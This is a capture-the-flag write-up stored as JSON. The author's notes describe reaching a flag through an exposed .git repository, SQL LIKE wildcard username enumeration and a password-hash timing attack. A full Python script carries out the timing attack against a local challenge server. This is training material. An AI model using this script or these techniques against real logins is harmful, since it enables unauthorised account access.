[
    {
        "type": "thought",
        "content": "Starting off, the first thing to notice is that the login form hashes the password client-side, then submits the hash to the server.\nAfter browsing around the website, you might notice that one of the pages makes a request to .git/refs/heads/master, meaning that the git repo for this code is publicly accessible.\nFrom there, clone the repo and get some of the source code: `git clone http://<url>/.git`\nNow, looking at the code, you can pretty easily determine that the password validation code is vulnerable to a timing attack. By guessing one letter at a time and measuring the request time, you can get the correct password hash.\nThe last thing you need is a correct username. The source code sign_up.php uses a LIKE comparison in a sql statement. If you try to sign up as the user %, it will tell you that the ~~FLAG~~ user is already taken.\nWith the correct username, you can write a script to guess the ~~FLAG~~ user's password hash. Once you do this, the page will give you the flag.\nTo address latency issues, we can increase the usleep delay in the password validation code, and also reduce the number of characters of the password hash that are checked before it returns true. There are also ways to overcome the latency issues when you write the guessing script, so a bit of variablility in latency could be an interesting part of the problem."
    },
    {
        "type": "execution",
        "content": "#!/usr/bin/env python\nimport itertools\nimport time\nimport requests\n\nfrom hashlib import md5\n\nURL = 'http://localhost:8089/premium.php'\nCHARS = \"abcdef0123456789\"\nGUESS_SIZE = 1\n\ndef main():\n    solution = \"\"\n    combinations = [x for x in itertools.combinations_with_replacement(CHARS, GUESS_SIZE)]\n\n    for i in range(32/GUESS_SIZE):\n        max_val = \"\"\n        max_time = -1\n        for c in combinations:\n            c = \"\".join(c)\n            t = average_time(pad(solution + c))\n            if t > max_time:\n                max_time = t\n                max_val = c\n                print \"New max\" + max_val\n        \n        solution = solution + max_val\n        print solution \n         \n\ndef pad(s):\n    return s + '_'*(32 - len(s))\n\ndef average_time(hsh, n=4):\n    l = [make_request(hsh) for i in range(n)] \n    return min(l)\n\ndef make_request(hsh):\n    t1 = time.time()\n    r = requests.post(URL, data={'username': '~~FLAG~~', 'password': hsh})\n    if \"Not Authorized\" not in r.content:\n        print r.status_code\n        print r.content\n        exit(0)\n    t2 = time.time()\n     \n    final = t2 - t1\n    print hsh + \": \" + str(final)\n    return final\n\nif __name__ == '__main__':\n    main()"
    }
]